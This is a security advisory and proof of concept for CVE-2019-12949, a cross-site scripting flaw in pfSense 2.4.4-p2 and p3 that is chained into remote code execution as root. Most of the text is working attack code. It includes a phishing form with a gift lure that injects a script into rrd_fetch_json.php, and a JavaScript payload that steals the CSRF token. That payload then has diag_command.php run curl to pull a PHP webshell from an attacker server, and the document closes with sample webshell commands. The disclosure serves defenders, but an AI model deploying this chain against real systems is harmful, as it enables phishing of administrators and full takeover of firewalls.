# [CVE-2019-12949] From Cross Site Scripting Vulnerability to Remote Code Execution in pfSense 2.4.4-p2 and 2.4.4-p3

## Information Description:

In pfSense 2.4.4-p2 and 2.4.4-p3, if it is possible to trich the authenticated administrator into clicking on a button on a phishing page, an attacker can upload arbitrary executable code via ding_command.php and rrd_fetch_json.php, to a server. Then, the remote attacker can run any command with root privileges on that server.

**Researcher: Enter of The Tarantula Team, VinCSS (a member of Vingroup)**

# PoC XSS 
Attack vector: **https://pfSense_IP_Address/rrd_fetch_json.php**
 
Send a POST request: 

```html
<form action="https://[PFsense-domain]/rrd_fetch_json.php" method="post">
	<input type="hidden" name="left" value="system-processor"><br>
	<input type="hidden" name="right" value="null"><br>
	<input type="hidden" name="start" value=""><br>
	<input type="hidden" name="end" value=""><br>
	<input type="hidden" name="resolution" value="300"><br>
	<input type="hidden" name="timePeriod" value="i3i3j<script>alert(1)</script>tz9b1"><br>
	<input type="hidden" name="graphtype" value="line"><br>
	<input type="hidden" name="invert" value="true"><br>
	<input type="hidden" name="refreshInterval" value="0">
  <h1>Congratulations on receiving the reward from us</h1>
  <h1>Click to receive gifts</h1>
  <input type="submit" value="Submit">
</form>
```

# XSS to RCE

Attacker can create a phishing site like this to exploit the XSS vulnerability on pfsense:

```html
<form action="https://[PFsense-domain]/rrd_fetch_json.php" method="post">
	<input type="hidden" name="left" value="system-processor"><br>
	<input type="hidden" name="right" value="null"><br>
	<input type="hidden" name="start" value=""><br>
	<input type="hidden" name="end" value=""><br>
	<input type="hidden" name="resolution" value="300"><br>
	<input type="hidden" name="timePeriod" value="i3i3j<script src='https://[Attacker-Server]/payload.js'></script>tz9b1"><br>
	<input type="hidden" name="graphtype" value="line"><br>
	<input type="hidden" name="invert" value="true"><br>
	<input type="hidden" name="refreshInterval" value="0">
  <h1>Congratulations on receiving the reward from us</h1>
  <h1>Click to receive gifts</h1>
  <input type="submit" value="Submit">
</form>
```

The payload.js file in attacker's server will contain the following Javascript code (Payload):

```javascript
<script>
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "https://[PFsense domain]/diag_command.php", false);
	xhr.withCredentials=true;
	xhr.send(null);
	var resp = xhr.responseText;
	console.log(resp);
	var start_idx = resp.indexOf('name=\'__csrf_magic\' value="');
	var end_idx = resp.indexOf('" />', start_idx);
	var token = resp.slice(start_idx + 27, end_idx);
	console.log(token);
// now execute the CSRF attack using XHR along with the extracted token
	var xhr1 = new XMLHttpRequest();
	xhr1.open("POST", "https://[PFsense-domain]/diag_command.php", false);
	xhr1.withCredentials=true;
	var params = "__csrf_magic="+token+"&txtCommand=curl https://[Attacker-Server]/shell.txt > a.php&submit=EXEC";
	xhr1.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhr1.setRequestHeader("Content-length", params.length);
	xhr1.send(params);
</script>
```

The shell.txt file in attacker's server will contain any PHP webshell contents, like this:

```php
<?php
	system($_REQUEST['cmd']); // allow remote attacker to run commands on victim server
	phpinfo(); // show phpinfo
?>
```

Finally, the attacker will trick the authenticated pfsense administrators (victim) to access the phishing site and click the 'Submit' button on phishing site. Then the victim will be redirected to the pfsense admin site, and webshell of the attacker will automatically be successfully loaded onto pfsense server.

From there, the remote attacker can execute arbitrary code as root on pfsense server:

```
https://[PFsense-domain]/a.php?cmd=whoami
https://[PFsense-domain]/a.php?cmd=ls
```
